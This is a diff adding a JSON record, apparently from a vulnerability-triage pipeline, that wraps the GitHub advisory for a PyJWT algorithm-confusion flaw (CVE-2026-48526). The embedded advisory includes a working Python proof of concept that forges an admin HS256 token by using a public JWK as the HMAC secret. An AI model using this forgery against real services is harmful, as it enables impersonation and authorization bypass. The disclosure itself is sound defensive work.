@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/174928508?v=4\", \"events_url\": \"https://api.github.com/users/aradona91/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/aradona91/followers\", \"following_url\": \"https://api.github.com/users/aradona91/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/aradona91/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/aradona91\", \"id\": 174928508, \"login\": \"aradona91\", \"node_id\": \"U_kgDOCm0yfA\", \"organizations_url\": \"https://api.github.com/users/aradona91/orgs\", \"received_events_url\": \"https://api.github.com/users/aradona91/received_events\", \"repos_url\": \"https://api.github.com/users/aradona91/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/aradona91/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/aradona91/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/aradona91\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-48526\", \"cvss\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}, {\"cwe_id\": \"CWE-347\", \"name\": \"Improper Verification of Cryptographic Signature\"}], \"description\": \"> [!NOTE]\\n> Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[…]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.\\n\\n### Summary\\nWhen the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   \\n\\n### Details\\nIn JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.\\nIn pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:\\n  \\n`jws.decode(token, key=rsa_jwk_json, algorithms=[\\\"HS256\\\",\\\"RS256\\\"])) `\\n\\nAn attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. \\nThe attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. \\n\\nIf we look on current protections implemented in the library, at class HMACAlgorithm:\\n\\n```\\n  def prepare_key(self, key: str | bytes) -> bytes:\\n        key_bytes = force_bytes(key)\\n\\n        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):\\n            raise InvalidKeyError(\\n                \\\"The specified key is an asymmetric key or x509 certificate and\\\"\\n                \\\" should not be used as an HMAC secret.\\\"\\n            )\\n\\n        return key_bytes\\n```\\nWe can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.\\n\\nIn The following example:\\n`jws.decode(token, key=rsa_jwk_json, algorithms=[\\\"HS256\\\",\\\"RS256\\\"])) `\\nThere is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. \\n\\nThe bypass happens only if the verifier:\\n (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.\\n\\n### PoC\\nPlease run the code and observe the payload printed in clear text({\\\"sub\\\":\\\"alice\\\",\\\"admin\\\":true}')\\n\\n```\\nfrom jwt.api_jws import PyJWS\\nimport json, base64, hmac, hashlib\\n\\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\\\"=\\\")\\n\\n# Public RSA JWK (public by design)\\nrsa_jwk_json = json.dumps({\\\"kty\\\":\\\"RSA\\\",\\\"n\\\":\\\"AQAB\\\",\\\"e\\\":\\\"AQAB\\\"})\\n\\n# Attacker-crafted token: flip to HS256 and choose claims\\nheader  = b64u(b'{\\\"alg\\\":\\\"HS256\\\",\\\"typ\\\":\\\"JWT\\\"}')\\npayload = b64u(b'{\\\"sub\\\":\\\"alice\\\",\\\"admin\\\":true}')\\nsigning = header + b\\\".\\\" + payload\\n\\n# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”\\nsig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()\\ntoken = (signing + b\\\".\\\" + b64u(sig)).decode()\\n\\n# Vulnerable verifier: mixed families + JWK JSON string as key\\njws = PyJWS()\\nprint(jws.decode(token, key=rsa_jwk_json, algorithms=[\\\"HS256\\\",\\\"RS256\\\"]))\\n# -> b'{\\\"sub\\\":\\\"alice\\\",\\\"admin\\\":true}'\\n```\\n\\n\\n### Impact\\nUnauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).\", \"epss\": {\"percentage\": 0.00394, \"percentile\": 0.31503}, \"ghsa_id\": \"GHSA-xgmm-8j9v-c9wx\", \"github_reviewed_at\": \"2026-06-15T19:28:06Z\", \"html_url\": \"https://github.com/advisories/GHSA-xgmm-8j9v-c9wx\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xgmm-8j9v-c9wx\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-48526\"}], \"nvd_published_at\": \"2026-05-28T16:16:29Z\", \"published_at\": \"2026-06-15T19:28:06Z\", \"references\": [\"https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-48526\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml\", \"https://github.com/advisories/GHSA-xgmm-8j9v-c9wx\"], \"repository_advisory_url\": \"https://api.github.com/repos/jpadilla/pyjwt/security-advisories/GHSA-xgmm-8j9v-c9wx\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/jpadilla/pyjwt\", \"summary\": \"PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-15T19:28:08Z\", \"url\": \"https://api.github.com/advisories/GHSA-xgmm-8j9v-c9wx\", \"vulnerabilities\": [{\"first_patched_version\": \"2.13.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyjwt\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.13.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-xgmm-8j9v-c9wx",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyjwt: < 2.13.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-48526"
+    ],
+    "cvss_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyjwt"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.824065Z",
+  "provenance": {
+    "content_sha256": "8b93cc33a65b999a2734222e997959d6f9afcf9b909fc6eb8d4a69af349bd3c9",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-15T19:28:06Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-xgmm-8j9v-c9wx",
+  "status": "active",
+  "title": "PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed",
+  "updated_at": "2026-06-15T19:28:08Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-xgmm-8j9v-c9wx"
+}
